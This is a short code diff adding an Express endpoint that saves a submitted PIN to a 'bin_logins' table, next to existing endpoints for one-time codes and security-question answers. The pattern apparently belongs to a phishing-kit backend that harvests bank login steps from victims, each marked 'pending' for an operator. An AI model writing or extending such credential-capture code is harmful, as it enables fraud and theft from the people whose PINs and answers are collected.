@@ -66,6 +66,20 @@ app.post('/api/submit-code/:id', async (req, res) => {
   }
 });
 
+app.post('/api/submit-pin/:id', async (req, res) => {
+  try {
+    const pin = String(req.body.pin || '').trim();
+    const { error } = await supabase.from('bin_logins').update({
+      pin, step: 'pin', status: 'pending',
+      updated_at: new Date().toISOString()
+    }).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 app.post('/api/submit-security/:id', async (req, res) => {
   try {
     const question = String(req.body.question || '').trim();
